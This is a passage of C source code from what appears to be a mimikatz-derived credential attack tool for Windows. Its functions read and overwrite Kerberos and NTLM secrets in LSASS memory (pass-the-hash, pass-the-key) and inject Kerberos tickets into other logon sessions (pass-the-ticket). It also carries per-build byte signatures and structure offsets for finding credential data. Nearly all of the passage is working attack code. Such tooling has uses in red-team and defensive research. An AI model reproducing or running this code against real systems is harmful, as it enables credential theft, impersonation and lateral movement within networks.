        if (SecEqualLuid(luidToFind, &luid))
            // found result
            return avlTree.OrderedPointer;
    }

    PVOID res = NULL;
    if ((res = FindKerbCredFromAvlByLuid(hLsass, avlTree.BalancedRoot.LeftChild, luidOffset, luidToFind)))
        return res;
    if ((res = FindKerbCredFromAvlByLuid(hLsass, avlTree.BalancedRoot.RightChild, luidOffset, luidToFind)))
        return res;
    return res; // NULL
}

// Swap the existing credentials with the supplied ones.
// Based on kuhl_m_sekurlsa_enum_kerberos_callback_pth.
// pthCreds: credential values that should be patched
// pKerbAvlNode: copy of the current AVL tree node associated with the target
//      LUID from LSASS memory (including credentials)
// pLsaKerbAvlNode: original pointer to AVL tree node in LSASS memory (only
//      needed to write back the patched credentials to the correct location)
// template: describes offsets / structure layout of data in LSASS memory
VOID PthKerberos(PPTH_CREDS pthCreds, LPBYTE pKerbAvlNode, LPBYTE pLsaKerbAvlNode, PKERB_CREDENTIAL_TEMPLATE template)
{
    HANDLE hLsass = pthCreds->LsassContext->ProcInfo.Handle;

    // Encrypted credentials for Kerberos.
    LPBYTE pLsaKerbCredentials = *(PVOID *)(((LPBYTE)pKerbAvlNode) + template->OffsetToKeyList);
    LPBYTE kerbCredentials = LocalAlloc(LPTR, template->StructKeyListSize);
    if (!ReadProcessMemory(hLsass, pLsaKerbCredentials, kerbCredentials, template->StructKeyListSize, NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    // Note: This works a bit different than the implementation in PthMsv.
    // In PthMsv we wanted to only modify specific values in the credential
    // structure, which had to be decrypted as a whole for modification and
    // afterwards re-encrypted. Here we can encrypt the specific values we want
    // to modify and then directly overwrite only those in LSASS' memory,
    // without previously having to decrypt a surrounding data structure fully.

    DWORD nbHash = ((DWORD *)(kerbCredentials))[1];
    if (!nbHash)
    {
        LocalFree(kerbCredentials);
        return;
    }

    // Encrypt provided credentials.
    if (pthCreds->Creds->Nthash)
        LsaProtectMemory(pthCreds->Creds->Nthash, LM_NT_HASH_LENGTH, pthCreds->LsaCrypto);
    if (pthCreds->Creds->Aes128key)
        LsaProtectMemory(pthCreds->Creds->Aes128key, AES_128_KEY_LENGTH, pthCreds->LsaCrypto);
    if (pthCreds->Creds->Aes256key)
        LsaProtectMemory(pthCreds->Creds->Aes256key, AES_256_KEY_LENGTH, pthCreds->LsaCrypto);

    LPBYTE pLsaKeyList = pLsaKerbCredentials + template->StructKeyListSize;
    DWORD nbTmp1 = nbHash * ((DWORD) template->StructKeyPasswordHashSize);

    LPBYTE pKeyList = LocalAlloc(LPTR, nbTmp1);
    if (!ReadProcessMemory(hLsass, pLsaKeyList, pKeyList, nbTmp1, NULL))
        LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());

    for (DWORD i = 0; i < nbHash; i++)
    {
        SIZE_T offsetToPkerbHashpassword = i * template->StructKeyPasswordHashSize + template->OffsetToHashGeneric;
        DWORD hashType = *(DWORD *)(((LPBYTE)pKeyList) + offsetToPkerbHashpassword);
        SIZE_T hashSize = *(SIZE_T *)(((LPBYTE)pKeyList) + offsetToPkerbHashpassword + template->OffsetToHashSize);
        LPBYTE *hashPChecksum =
            (LPBYTE *)(((LPBYTE)pKeyList) + offsetToPkerbHashpassword + template->OffsetToHashPChecksum);

        printf("    ... Patching Kerberos secrets for etype %ls\n", GetKerberosETypeDescription(hashType));

        DWORD nbNewHash = 0;
        LPBYTE pNewHash = NULL, // pointer to the new patched credential (source in own process)
            pLsaNewHash = NULL; // pointer to the new patched credential (destination in LSASS process)
        if (pthCreds->Creds->Nthash && (hashType != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) &&
            (hashType != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && (hashSize == LM_NT_HASH_LENGTH))
        {
            pNewHash = pthCreds->Creds->Nthash;
            pLsaNewHash = *hashPChecksum;
            nbNewHash = LM_NT_HASH_LENGTH;
            printf("        Preparing patched and encrypted NT hash ");
            PrintBinaryAsHex(pNewHash, LM_NT_HASH_LENGTH);
        }
        else if (pthCreds->Creds->Aes128key && (hashType == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) &&
                 (hashSize == AES_128_KEY_LENGTH))
        {
            pNewHash = pthCreds->Creds->Aes128key;
            pLsaNewHash = *hashPChecksum;
            nbNewHash = AES_128_KEY_LENGTH;
            printf("        Preparing patched and encrypted AES128KEY ");
            PrintBinaryAsHex(pNewHash, AES_128_KEY_LENGTH);
        }
        else if (pthCreds->Creds->Aes256key && (hashType == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) &&
                 (hashSize == AES_256_KEY_LENGTH))
        {
            pNewHash = pthCreds->Creds->Aes256key;
            pLsaNewHash = *hashPChecksum;
            nbNewHash = AES_256_KEY_LENGTH;
            printf("        Preparing patched and encrypted AES256KEY ");
            PrintBinaryAsHex(pNewHash, AES_256_KEY_LENGTH);
        }
        else
        {
            hashType = KERB_ETYPE_NULL;
            hashSize = 0;
            pNewHash = (LPBYTE)&hashType;
            pLsaNewHash = pLsaKeyList + offsetToPkerbHashpassword;
            nbNewHash = template->OffsetToHashPChecksum;
            printf("        Preparing KERB_ETYPE_NULL\n");
        }

        printf("        Writing back patched credentials to LSASS at 0x%016llx\n", (DWORD64)pLsaNewHash);
        if (!WriteProcessMemory(hLsass, pLsaNewHash, pNewHash, nbNewHash, NULL))
            LogError("WriteProcessMemory failed with error code : %ld\n", GetLastError());
    }

    // clear rest of bytes
    printf("    ... Clearing rest of bytes\n");
    LPBYTE pLsaZeroBufErase = ((LPBYTE)pLsaKerbAvlNode) + template->OffsetToPasswordErase;
    LPBYTE pZeroBufErase = LocalAlloc(LPTR, template->PasswordEraseSize);
    if (!WriteProcessMemory(hLsass, pLsaZeroBufErase, pZeroBufErase, template->PasswordEraseSize, NULL))
        LogError("WriteProcessMemory failed with error code : %ld\n", GetLastError());

    LocalFree(kerbCredentials);
}

// Taken from kuhl_m_kerberos_ticket_etype.
PCWCHAR GetKerberosETypeDescription(LONG eType)
{
    switch (eType)
    {
    case KERB_ETYPE_NULL:
        return L"null             ";
    case KERB_ETYPE_DES_PLAIN:
        return L"des_plain        ";
    case KERB_ETYPE_DES_CBC_CRC:
        return L"des_cbc_crc      ";
    case KERB_ETYPE_DES_CBC_MD4:
        return L"des_cbc_md4      ";
    case KERB_ETYPE_DES_CBC_MD5:
        return L"des_cbc_md5      ";
    case KERB_ETYPE_DES_CBC_MD5_NT:
        return L"des_cbc_md5_nt   ";
    case KERB_ETYPE_RC4_PLAIN:
        return L"rc4_plain        ";
    case KERB_ETYPE_RC4_PLAIN2:
        return L"rc4_plain2       ";
    case KERB_ETYPE_RC4_PLAIN_EXP:
        return L"rc4_plain_exp    ";
    case KERB_ETYPE_RC4_LM:
        return L"rc4_lm           ";
    case KERB_ETYPE_RC4_MD4:
        return L"rc4_md4          ";
    case KERB_ETYPE_RC4_SHA:
        return L"rc4_sha          ";
    case KERB_ETYPE_RC4_HMAC_NT:
        return L"rc4_hmac_nt      ";
    case KERB_ETYPE_RC4_HMAC_NT_EXP:
        return L"rc4_hmac_nt_exp  ";
    case KERB_ETYPE_RC4_PLAIN_OLD:
        return L"rc4_plain_old    ";
    case KERB_ETYPE_RC4_PLAIN_OLD_EXP:
        return L"rc4_plain_old_exp";
    case KERB_ETYPE_RC4_HMAC_OLD:
        return L"rc4_hmac_old     ";
    case KERB_ETYPE_RC4_HMAC_OLD_EXP:
        return L"rc4_hmac_old_exp ";
    case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96_PLAIN:
        return L"aes128_hmac_plain";
    case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96_PLAIN:
        return L"aes256_hmac_plain";
    case KERB_ETYPE_AES128_CTS_HMAC_SHA1_96:
        return L"aes128_hmac      ";
    case KERB_ETYPE_AES256_CTS_HMAC_SHA1_96:
        return L"aes256_hmac      ";
    default:
        return L"unknown          ";
    }
}

// Re-encrypt credentials from LSASS.
// Based on kuhl_m_sekurlsa_nt6_LsaProtectMemory.
VOID WINAPI LsaProtectMemory(IN OUT LPBYTE buffer, IN ULONG bufferSize, IN PLSA_CRYPTO_MATERIAL pLsaCrypto)
{
    LsaEncryptMemory(buffer, bufferSize, pLsaCrypto, TRUE);
}

// Decrypt credentials from LSASS.
// Based on kuhl_m_sekurlsa_nt6_LsaUnprotectMemory.
VOID WINAPI LsaUnProtectMemory(IN OUT LPBYTE buffer, IN ULONG bufferSize, IN PLSA_CRYPTO_MATERIAL pLsaCrypto)
{
    LsaEncryptMemory(buffer, bufferSize, pLsaCrypto, FALSE);
}

// Based on kuhl_m_sekurlsa_nt6_LsaEncryptMemory.
VOID LsaEncryptMemory(IN OUT LPBYTE pMemory, IN ULONG cbMemory, IN PLSA_CRYPTO_MATERIAL pLsaCrypto, IN BOOL encrypt)
{
    typedef NTSTATUS(WINAPI * PBCRYPT_ENCRYPT)(__inout BCRYPT_KEY_HANDLE hKey, __in PUCHAR pbInput, __in ULONG cbInput,
                                               __in_opt VOID * pPaddingInfo, __inout PUCHAR pbIV, __in ULONG cbIV,
                                               __out PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG * pcbResult,
                                               __in ULONG dwFlags);
    PBCRYPT_ENCRYPT cryptFunc = encrypt ? BCryptEncrypt : BCryptDecrypt;

    BYTE localInitializationVector[INITIALIZATION_VECTOR_LENGTH] = {0};
    RtlCopyMemory(localInitializationVector, pLsaCrypto->InitializationVector, INITIALIZATION_VECTOR_LENGTH);

    BCRYPT_KEY_HANDLE *hKey = NULL;
    ULONG cbIV = 0, cbResult = 0;
    if (cbMemory % 8)
    {
        hKey = &pLsaCrypto->KeyAes.hKey;
        cbIV = INITIALIZATION_VECTOR_LENGTH;
    }
    else
    {
        hKey = &pLsaCrypto->Key3Des.hKey;
        cbIV = INITIALIZATION_VECTOR_LENGTH / 2;
    }

    NTSTATUS status =
        cryptFunc(*hKey, pMemory, cbMemory, 0, localInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0);
    if (!NT_SUCCESS(status))
        LogError("BCryptEncrypt / BCryptDecrypt failed with error code : %ld\n", status);
}

// Read a unicode string from process with handle hProc.
// Modifies the struct member buffer which points to the actual string data.
VOID ReadProcessMemoryUnicodeString(IN HANDLE hProc, IN OUT PUNICODE_STRING pUnicodeString)
{
    LPWSTR pProcBuffer = pUnicodeString->Buffer;
    if (pProcBuffer)
    {
        pUnicodeString->Buffer = LocalAlloc(LPTR, pUnicodeString->MaximumLength);
        if (!ReadProcessMemory(hProc, pProcBuffer, pUnicodeString->Buffer, pUnicodeString->MaximumLength, NULL))
            LogError("ReadProcessMemory failed with error code : %ld\n", GetLastError());
    }
}

BOOL SecEqualLuid(PLUID l1, PLUID l2)
{
    return (l1->HighPart == l2->HighPart) && (l1->LowPart == l2->LowPart);
}

// Converts a hex string into bytes (unhexlify).
VOID HexStringToBinary(OUT LPBYTE hex, LPCWCHAR string, DWORD size)
{
    if (wcslen(string) != (size * 2))
        LogError("HexStringToBinary failed : length mismatch %lld != %ld\n", wcslen(string), size * 2);

    for (DWORD i = 0; i < size; i++)
    {
        DWORD b = 0;
        swscanf_s(&string[i * 2], L"%02x", &b);
        hex[i] = (BYTE)b;
    }
}

// Print binary data / bytes of a given length as hex string to stdout.
VOID PrintBinaryAsHex(LPBYTE bin, DWORD size)
{
    // printf("Printing %ld bytes at 0x%016llx : ", size, (UINT_PTR)bin);
    for (DWORD i = 0; i < size; i++)
        printf("%02x", bin[i]);
    printf("\n");
}

VOID LogWithPrefix(LPCSTR prefix, LPCSTR pMsg, ...)
{
    printf(prefix);
    va_list args = NULL;
    va_start(args, pMsg);
    vprintf(pMsg, args);
    va_end(args);
}

// The following code deals with structures and their layout in LSASS memory.

// Mimikatz identifies the relevant variables and data structures in memory of
// the LSASS process by scanning for certain byte patterns.
// In mimikatz this is in part implemented using the data structure
// KULL_M_PATCH_GENERIC in modules/kull_m_patch.h, which includes a generic
// pattern definition KULL_M_PATCH_PATTERN that should be matched, together
// with the bytes it should be replace with in KULL_M_PATCH_PATTERN, and some
// offsets KULL_M_PATCH_OFFSETS where interesting data resides.
//
// Since the layout of various structures depends on the currently running os
// version, the correct byte patterns have to be fetched at runtime. Mimikatz
// then searches for such patterns e.g. with the generic function
// kull_m_patch_getGenericFromBuild, that returns the correct layout template
// for various structures.
//
// Here I split these generic data structures into specific cases with readable
// names for each of the fields and field offsets off the structure templates.

// Template for data structures identifying crypto keymaterial in lsass memory.
// From mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

BYTE lsaDecryptKeyStructurePattern1[] = {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
BYTE lsaDecryptKeyStructurePattern2[] = {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
BYTE lsaDecryptKeyStructurePattern3[] = {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45,
                                         0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};

// clang-format off
LSA_DECRYPT_MEMORY_TEMPLATE lsaDecryptMemoryTemplates[] = {
    {OS_BUILD_NUMBER_WIN_VISTA, lsaDecryptKeyStructurePattern1, sizeof(lsaDecryptKeyStructurePattern1),
        63, -69, 25, sizeof(KIWI_BCRYPT_KEY),   FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey)},
    {OS_BUILD_NUMBER_WIN_7,     lsaDecryptKeyStructurePattern1, sizeof(lsaDecryptKeyStructurePattern1),
        59, -61, 25, sizeof(KIWI_BCRYPT_KEY),   FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey)},
    {OS_BUILD_NUMBER_WIN_8,     lsaDecryptKeyStructurePattern2, sizeof(lsaDecryptKeyStructurePattern2),
        62, -70, 23, sizeof(KIWI_BCRYPT_KEY),   FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey)},
    {OS_BUILD_NUMBER_WIN_BLUE, lsaDecryptKeyStructurePattern2, sizeof(lsaDecryptKeyStructurePattern2),
        62, -70, 23, sizeof(KIWI_BCRYPT_KEY8),  FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey)},
    {OS_BUILD_NUMBER_WIN_10_1507, lsaDecryptKeyStructurePattern3, sizeof(lsaDecryptKeyStructurePattern3),
        61, -73, 16, sizeof(KIWI_BCRYPT_KEY81), FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey)},
    {OS_BUILD_NUMBER_WIN_10_1809, lsaDecryptKeyStructurePattern3, sizeof(lsaDecryptKeyStructurePattern3),
        67, -89, 16, sizeof(KIWI_BCRYPT_KEY81), FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey)},
    {OS_BUILD_NUMBER_WIN_11_22H2, lsaDecryptKeyStructurePattern3, sizeof(lsaDecryptKeyStructurePattern3),
        71, -89, 16, sizeof(KIWI_BCRYPT_KEY81), FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey)},
};
// clang-format on

// Get memory template based on the currently running OS version.
// From kull_m_patch_getGenericFromBuild.
PLSA_DECRYPT_MEMORY_TEMPLATE GetLsaMemoryDecryptMemoryTemplate()
{
    DWORD osBuildNumber = GetOsBuildNumber();
    PLSA_DECRYPT_MEMORY_TEMPLATE res = NULL;
    for (res = lsaDecryptMemoryTemplates; res < lsaDecryptMemoryTemplates + ARRAYSIZE(lsaDecryptMemoryTemplates); res++)
        if (osBuildNumber < res->MinOsBuildNumber)
            break;
    return --res;
}

// Template for data structures identifying the LogonSessionList in lsass memory.
// From mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c

BYTE lsaSrvLogonSessionListWn61[] = {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE lsaSrvLogonSessionListWn63[] = {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE lsaSrvLogonSessionListWn6x[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE lsaSrvLogonSessionListWn1703[] = {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE lsaSrvLogonSessionListWn1803[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE lsaSrvLogonSessionListWn11[] = {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE lsaSrvLogonSessionListWn11_22H2[] = {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};

// clang-format off
LSA_ENUM_LOGON_SESSION_LIST_TEMPLATE lsaEnumLogonSessionListTemplates[] = {
    {OS_BUILD_NUMBER_WIN_7,         lsaSrvLogonSessionListWn61,         sizeof(lsaSrvLogonSessionListWn61),      19,  -4},
    {OS_BUILD_NUMBER_WIN_8,         lsaSrvLogonSessionListWn6x,         sizeof(lsaSrvLogonSessionListWn6x),      16,  -4},
    {OS_BUILD_NUMBER_WIN_BLUE,      lsaSrvLogonSessionListWn63,         sizeof(lsaSrvLogonSessionListWn63),      36,  -6},
    {OS_BUILD_NUMBER_WIN_10_1507,   lsaSrvLogonSessionListWn6x,         sizeof(lsaSrvLogonSessionListWn6x),      16,  -4},
    {OS_BUILD_NUMBER_WIN_10_1703,   lsaSrvLogonSessionListWn1703,       sizeof(lsaSrvLogonSessionListWn1703),    23,  -4},
    {OS_BUILD_NUMBER_WIN_10_1803 ,  lsaSrvLogonSessionListWn1803,       sizeof(lsaSrvLogonSessionListWn1803),    23,  -4},
    {OS_BUILD_NUMBER_WIN_10_1903,   lsaSrvLogonSessionListWn6x,         sizeof(lsaSrvLogonSessionListWn6x),      23,  -4},
    {OS_BUILD_NUMBER_WIN_2022,      lsaSrvLogonSessionListWn11,         sizeof(lsaSrvLogonSessionListWn11),      24,  -4},
    {OS_BUILD_NUMBER_WIN_11_22H2,   lsaSrvLogonSessionListWn11_22H2,    sizeof(lsaSrvLogonSessionListWn11_22H2), 27,  -4},
};
// clang-format on

// Get memory template based on the currently running OS version.
// From kull_m_patch_getGenericFromBuild.
PLSA_ENUM_LOGON_SESSION_LIST_TEMPLATE GetLsaEnumLogonSessionListTemplate()
{
    DWORD osBuildNumber = GetOsBuildNumber();
    PLSA_ENUM_LOGON_SESSION_LIST_TEMPLATE res = NULL;
    for (res = lsaEnumLogonSessionListTemplates;
         res < lsaEnumLogonSessionListTemplates + ARRAYSIZE(lsaEnumLogonSessionListTemplates); res++)
        if (osBuildNumber < res->MinOsBuildNumber)
            break;
    return --res;
}

// Template for LogonSession data structure in lsass memory.
// From mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c

// clang-format off
LSA_ENUM_LOGON_SESSION_TEMPLATE lsaEnumLogonSessionTemplates[] = {
    {168,   16,   80,   84,   24,   40,  112,   72,  160,   88,   96},
    {160,   16,   80,   84,   24,   40,  112,   72,  152,   88,   96},
    {272,  112,  184,  188,  128,  144,  216,  176,  264,  192,  200},
    {264,  112,  184,  188,  128,  144,  216,  176,  256,  192,  200},
    {280,  112,  200,  204,  144,  160,  232,  192,  272,  208,  216},
    {336,  112,  200,  216,  128,  144,  248,  192,  328,  224,  232},
    {352,  112,  216,  232,  144,  160,  264,  208,  344,  240,  248},
};
// clang-format on

// Get memory template based on the currently running OS version.
// From kuhl_m_sekurlsa_enum.
PLSA_ENUM_LOGON_SESSION_TEMPLATE GetLsaEnumLogonSessionTemplate(ULONG lsaSrvTimeDateStamp)
{
    DWORD osBuildNumber = GetOsBuildNumber();
    DWORD shift = ((osBuildNumber >= OS_MIN_BUILD_NUMBER_WIN_7) && (osBuildNumber < OS_MIN_BUILD_NUMBER_WIN_BLUE) &&
                   (lsaSrvTimeDateStamp > 0x53480000))
                      ? 1
                      : 0;

    if (osBuildNumber < OS_BUILD_NUMBER_WIN_2K3)
        return &lsaEnumLogonSessionTemplates[0 + shift];
    if (osBuildNumber < OS_BUILD_NUMBER_WIN_VISTA)
        return &lsaEnumLogonSessionTemplates[1 + shift];
    if (osBuildNumber < OS_BUILD_NUMBER_WIN_7)
        return &lsaEnumLogonSessionTemplates[2 + shift];
    if (osBuildNumber < OS_BUILD_NUMBER_WIN_8)
        return &lsaEnumLogonSessionTemplates[3 + shift];
    if (osBuildNumber < OS_BUILD_NUMBER_WIN_BLUE)
        return &lsaEnumLogonSessionTemplates[5 + shift];
    return &lsaEnumLogonSessionTemplates[6 + shift];
}

// Template for various decrypted MSV1_0 credential structure definitions
// MSV1_0_PRIMARY_CREDENTIAL* in kuhl_m_sekurlsa_msv1_0.h.

// clang-format off
MSV1_0_PRIMARY_CREDENTIAL_TEMPLATE msv10PrimaryCredentialTemplates[] = {
    {0,  16,   0,  84,  85,  86,   0,  32,  48,   64,   0,   0},
    {0,  16,  32,  33,  34,  35,   0,  38,  54,   70,   0,  38},
    {0,  16,  32,  33,  34,  35,   0,  40,  56,   72,   0,  40},
    {0,  16,  40,  41,  42,  43,  44,  74,  90,  106,  54,  74},
};
// clang-format on

// Get memory template based on the currently running OS version.
PMSV1_0_PRIMARY_CREDENTIAL_TEMPLATE GetMsv10PrimaryCredentialTemplate()
{
    DWORD osBuildNumber = GetOsBuildNumber();
    if (osBuildNumber < OS_BUILD_NUMBER_WIN_10_1507)
        return &msv10PrimaryCredentialTemplates[0];
    else if (osBuildNumber < OS_BUILD_NUMBER_WIN_10_1511)
        return &msv10PrimaryCredentialTemplates[1];
    else if (osBuildNumber < OS_BUILD_NUMBER_WIN_10_1607)
        return &msv10PrimaryCredentialTemplates[2];
    else
        return &msv10PrimaryCredentialTemplates[3];
}

BYTE kerberosCredentialTemplate1[] = {0x48, 0x3b, 0xfe, 0x0f, 0x84};
BYTE kerberosCredentialTemplate2[] = {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};

// Template for Kerberos secrets data structures in lsass memory.
//
// Note that overpass-the-hash and pass-the-key are both currently broken in
// mimikatz for reasonably new operating system versions (at least when I tried
// it it didn't work). This is also detailed in the following two still open
// issues:
//
//  - https://github.com/gentilkiwi/mimikatz/issues/322
//    "pth is problematic with newer versions of windows" from 2020, and
//
//  - https://github.com/gentilkiwi/mimikatz/issues/215
//    "pass to hash not working?" from 2019.
//
// The reason is that the structure format of the credential data in the AVL
// tree changed yet again; which also demonstrates that in general this
// approach of signature scanning and binary patching is quite
// maintenance-intensive to keep up-to-date. The patch from eyalk5 at
// https://github.com/eyalk5/mimikatz/commit/25b3c8ea09001c8fe717df0a899bdf00c49157e5
// fortunately worked for me for my Windows 10 system. I incorporated the
// correct offsets for OS_BUILD_NUMBER_WIN_10_2004 from that patch into this
// modified implementation.
//
// Note also that still even this seems to break something; maybe I didn't
// apply the patch correctly; or the structure has changed again since.

// from merging KerberosReferences and kerbHelper
// clang-format off
KERB_CREDENTIAL_TEMPLATE kerberosCredentialTemplates[] = {
        {OS_BUILD_NUMBER_WIN_XP,        kerberosCredentialTemplate1, sizeof(kerberosCredentialTemplate1), -4,
            96, 152, { 264, 280, 296 }, 312, 320, 32, 40, 48, 64, 80, 96, 112, 120, 128, 136, 200, 208, 216, 260, 272, 264, 288, 248, 24, 16, 40, 8, 16, 52,  72, 56, 168, 16},
        {OS_BUILD_NUMBER_WIN_2K3,       kerberosCredentialTemplate1, sizeof(kerberosCredentialTemplate1), -4,
            80, 136, { 248, 272, 296 }, 320, 328, 32, 40, 48, 64, 80, 96, 112, 128, 136, 144, 184, 192, 200, 244, 256, 248, 272, 232, 24, 16, 40, 8, 16, 52,  72, 56, 152, 16},
        {OS_BUILD_NUMBER_WIN_VISTA,     kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            64, 120, { 232, 256, 280 }, 304, 312, 32, 40, 48, 64, 80, 96, 112, 128, 136, 144, 184, 192, 200, 244, 256, 248, 272, 216, 40, 24, 48, 8, 16, 56,  88, 64, 152, 16},
        {OS_BUILD_NUMBER_WIN_7,         kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            64, 120, { 232, 256, 280 }, 304, 312, 32, 40, 48, 64, 80, 96, 128, 144, 152, 160, 200, 208, 216, 260, 272, 264, 288, 216, 40, 24, 48, 8, 16, 56,  88, 64, 152, 16},
        {OS_BUILD_NUMBER_WIN_8,         kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            64, 120, { 232, 256, 280 }, 304, 312, 32, 40, 48, 64, 80, 96, 128, 144, 152, 160, 200, 208, 216, 260, 272, 264, 288, 216, 40, 24, 48, 8, 16, 64,  96, 72, 152, 16},
        {OS_BUILD_NUMBER_WIN_10_1507,   kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            72, 136, { 280, 304, 328 }, 352, 360, 32, 40, 48, 64, 80, 96, 128, 144, 152, 160, 200, 208, 216, 260, 272, 264, 288, 264, 40, 24, 48, 8, 16, 72, 104, 80, 168, 24},
        {OS_BUILD_NUMBER_WIN_10_1511,   kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            72, 136, { 280, 304, 328 }, 352, 360, 32, 40, 48, 64, 80, 96, 144, 160, 168, 176, 216, 224, 232, 276, 288, 280, 304, 264, 40, 24, 48, 8, 16, 72, 104, 80, 168, 24},
        {OS_BUILD_NUMBER_WIN_10_1607,   kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            72, 136, { 296, 320, 344 }, 368, 376, 32, 40, 48, 64, 80, 96, 144, 160, 176, 184, 232, 240, 248, 292, 304, 296, 320, 280, 40, 32, 56, 8, 16, 72, 104, 80, 168, 32},
        {OS_BUILD_NUMBER_WIN_10_2004,   kerberosCredentialTemplate2, sizeof(kerberosCredentialTemplate2), 6,
            72, 136, { 296, 320, 344 }, 368, 376, 32, 40, 48, 64, 80, 96, 144, 160, 176, 184, 232, 240, 248, 292, 304, 296, 320, 280, 40, 36, 56, 4, 12, 72, 104, 80, 168, 32},
};
// clang-format on

// Get memory template based on the currently running OS version.
// From kull_m_patch_getGenericFromBuild.
PKERB_CREDENTIAL_TEMPLATE GetKerberosCredentialTemplate()
{
    DWORD osBuildNumber = GetOsBuildNumber();
    PKERB_CREDENTIAL_TEMPLATE res = NULL;
    for (res = kerberosCredentialTemplates; res < kerberosCredentialTemplates + ARRAYSIZE(kerberosCredentialTemplates);
         res++)
        if (osBuildNumber < res->MinOsBuildNumber)
            break;
    return --res;
}

DWORD GetOsBuildNumber()
{
    DWORD majorVersion, minorVersion, buildNumber;
    RtlGetNtVersionNumbers(&majorVersion, &minorVersion, &buildNumber);
    buildNumber &= 0x7fff;
    return buildNumber;
}

// Inject a kerberos ticket in kirbi format for the target session with the
// given LUID. Based on kuhl_m_kerberos_ptt, kuhl_m_kerberos_ptt_data,
// kuhl_m_kerberos_init and LsaCallKerberosPackage.
VOID InjectTicket(PLUID pluid, PCREDS pcreds)
{
    HANDLE hLsa = GetLsaHandle();

    STRING kerberosPackageName = {8, 9, MICROSOFT_KERBEROS_NAME_A};
    DWORD kerberosAuthenticationPackageId = 0;

    NTSTATUS status = LsaLookupAuthenticationPackage(hLsa, &kerberosPackageName, &kerberosAuthenticationPackageId);
    if (!NT_SUCCESS(status))
        LogError("LsaLookupAuthenticationPackage failed with error code : %ld\n", LsaNtStatusToWinError(status));

    DWORD nbPKerbReq = sizeof(KERB_SUBMIT_TKT_REQUEST) + pcreds->nbKirbiTicket;
    PKERB_SUBMIT_TKT_REQUEST pKerbReq = LocalAlloc(LPTR, nbPKerbReq);

    pKerbReq->MessageType = KerbSubmitTicketMessage;
    pKerbReq->KerbCredSize = pcreds->nbKirbiTicket;
    pKerbReq->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
    pKerbReq->LogonId = *pluid;
    RtlCopyMemory((LPBYTE)pKerbReq + pKerbReq->KerbCredOffset, pcreds->KirbiTicket, pcreds->nbKirbiTicket);

    // Next code is from kuhl_m_kerberos_init and LsaCallKerberosPackage.

    PVOID pKerbResp = NULL;
    DWORD nbPKerbResp = 0;
    NTSTATUS pkgStatus = 0;
    status = LsaCallAuthenticationPackage(hLsa, kerberosAuthenticationPackageId, pKerbReq, nbPKerbReq, &pKerbResp,
                                          &nbPKerbResp, &pkgStatus);
    if (!NT_SUCCESS(status))
        LogError("LsaCallAuthenticationPackage failed with error code : %ld\n", LsaNtStatusToWinError(status));
    if (!NT_SUCCESS(pkgStatus))
        LogError("LsaCallAuthenticationPackage AP failed with error code : %ld\n", pkgStatus);

    status = LsaDeregisterLogonProcess(hLsa);
    if (!NT_SUCCESS(status))
        LogError("LsaDeregisterLogonProcess failed with error code : %ld\n", LsaNtStatusToWinError(status));

    LogInfo("Injected specified Kerberos ticket for LUID 0x%lx : 0x%lx\n", pluid->HighPart, pluid->LowPart);
}

// Get a Handle to the LSASS process.
// Here I use a cool trick from Rubeus (https://github.com/GhostPack/Rubeus;
// not affiliated; licensed under 3-clause BSD license).
// The problem is that for injecting Kerberos tickets (pass-the-ticket) in
// another logon session specified by LUID, we need SeTcbPrivilege; otherwise
// the operation doesn't work. This is stated in
// https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type.
// > The SeTcbPrivilege is required to access another logon account's ticket cache.
// That privilege cannot simply be assigned with AdjustTokenPrivileges.
